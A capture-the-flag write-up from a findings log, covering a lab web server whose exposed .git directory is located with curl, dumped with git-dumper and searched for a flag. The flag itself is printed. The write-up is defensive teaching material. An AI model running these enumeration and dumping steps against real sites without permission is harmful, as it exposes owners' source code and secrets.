# Day 2 — Room 404

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed
- **URL:** `/room/hh-room404-804573bf` — lab target `http://<LAB_IP>:8080` (e.g. `10.144.176.152:8080`)
- **Category:** Web → Directory Enumeration
- **Objective:** Dump the exposed source code, find the flag.
- **Story hook:** _"port 8080 is wide open, and the rooms it never lists are the ones worth finding"_ + _"the night-shift developer shipped more than the website"_ → an exposed `.git` directory was deployed alongside the site.
- **Attack path:**
  1. Confirmed target reachable on port 8080.
  2. Directory enumeration / probing revealed an exposed **`.git/`** folder (`/.git/HEAD` returned a ref).
  3. Dumped the repo with **`git-dumper`** → recovered the staging repository (`app.js`, `index.html`, `README.md`).
  4. Flag was left in the repo **`README.md`** as a "staging flag (remove before launch)".
- **Flag:** <details><summary>click to reveal</summary><code>THM{byt3_l0tus_n3v3r_f0rg3ts}</code></details>
- **Lesson:** Never deploy the `.git` directory to a public web root — it lets anyone reconstruct full source (and secrets) via `git-dumper`.
- **Notes:** Local dump saved at `C:\Users\varun\Desktop\room404_src` (contains `.git`, `app.js`, `index.html`, `README.md`).

## Walkthrough

1. **Confirm connectivity to the lab machine** (VPN reachability from Kali-WSL):

   ```bash
   ping -c 3 10.144.176.152
   curl -I http://10.144.176.152:8080
   ```

2. **Enumerate the web root.** The story hint ("the rooms it never lists") points at hidden/unlinked paths. Directory brute-forcing missed the dotfolder at first (SecLists wordlist was not present — installed later with `sudo apt install -y seclists`), so the `.git` directory was found by probing it directly:

   ```bash
   curl -s http://10.144.176.152:8080/.git/HEAD
   # -> ref: refs/heads/master   (confirms an exposed Git repo)
   ```

3. **Dump the exposed repository** with `git-dumper`:

   ```bash
   pipx install git-dumper        # or: pip install git-dumper
   git-dumper http://10.144.176.152:8080/.git/ room404_src
   ```

4. **Read the recovered source** — the flag was left in the staging `README.md` ("remove before launch"):

   ```bash
   grep -rniE 'thm\{' room404_src
   # room404_src/README.md: Staging flag (remove before launch): THM{...}
   ```

5. **Submit** the recovered flag in the room's "What is the flag?" box. ✅

## Recovered repo contents

| File         | Purpose                                                            |
| ------------ | ----------------------------------------------------------------- |
| `README.md`  | Staging notes — **contained the flag**                            |
| `index.html` | Guest-experience platform front page                              |
| `app.js`     | Concierge personalization client script                           |
| `.git/`      | Full version history that made the source recoverable             |
